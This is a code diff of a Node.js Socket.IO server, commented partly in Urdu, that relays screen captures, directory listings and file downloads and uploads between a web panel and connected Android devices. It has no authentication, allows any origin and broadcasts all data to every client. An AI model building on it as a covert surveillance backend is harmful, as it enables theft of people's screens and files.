@@ -6,10 +6,13 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 
-// Increased buffer size for large file transfers (1GB limit)
+// مضبوط ساکٹ کنفیگریشن تاکہ بار بار ڈسکنیکٹ نہ ہو
 const io = new Server(server, { 
     cors: { origin: "*" },
-    maxHttpBufferSize: 1e9 
+    maxHttpBufferSize: 1e9, // 1GB limit for files
+    allowEIO3: true,
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
 app.get('/', (req, res) => {
@@ -17,44 +20,30 @@ app.get('/', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('Device connected:', socket.id);
+    console.log('🟢 Device connected:', socket.id);
 
-    // --- SCREEN CAPTURE ---
+    // --- لائیو ڈیبگ لاگز (اینڈرائیڈ سے آئیں گے) ---
+    socket.on('app_debug_log', (msg) => {
+        console.log(`📱 [APP LOG - ${socket.id}]:`, msg);
+    });
+
+    // --- سکرین کیپچر ---
     socket.on('send_screenshot', (data) => socket.broadcast.emit('receive_screenshot', data));
     socket.on('request_single_shot', () => socket.broadcast.emit('command_single_shot'));
     socket.on('request_timer_stream', (data) => socket.broadcast.emit('command_timer_stream', data));
 
-    // --- FULL FILE MANAGER ---
-    
-    // Request list of files for a specific directory path
-    socket.on('request_directory', (dirPath) => {
-        socket.broadcast.emit('command_get_directory', dirPath);
-    });
+    // --- فائل مینیجر ---
+    socket.on('request_directory', (dirPath) => socket.broadcast.emit('command_get_directory', dirPath));
+    socket.on('send_directory_list', (data) => socket.broadcast.emit('receive_directory_list', data));
+    socket.on('request_download_file', (filePath) => socket.broadcast.emit('command_download_file', filePath));
+    socket.on('send_file_data', (fileData) => socket.broadcast.emit('receive_file_data', fileData));
+    socket.on('request_upload_file', (uploadData) => socket.broadcast.emit('command_upload_file', uploadData));
 
-    // Receive directory list from app and send to web panel
-    socket.on('send_directory_list', (data) => {
-        socket.broadcast.emit('receive_directory_list', data);
-    });
-
-    // Request to download a specific file from app
-    socket.on('request_download_file', (filePath) => {
-        socket.broadcast.emit('command_download_file', filePath);
-    });
-
-    // Receive file data from app and send to web panel to trigger download
-    socket.on('send_file_data', (fileData) => {
-        socket.broadcast.emit('receive_file_data', fileData);
-    });
-
-    // Request to upload a file to the app's current directory
-    socket.on('request_upload_file', (uploadData) => {
-        socket.broadcast.emit('command_upload_file', uploadData);
-    });
-
-    socket.on('disconnect', () => {
-        console.log('Device disconnected:', socket.id);
+    // --- ڈسکنیکٹ ہونے کی وجہ ---
+    socket.on('disconnect', (reason) => {
+        console.log(`🔴 Device disconnected: ${socket.id} | Reason: ${reason}`);
     });
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
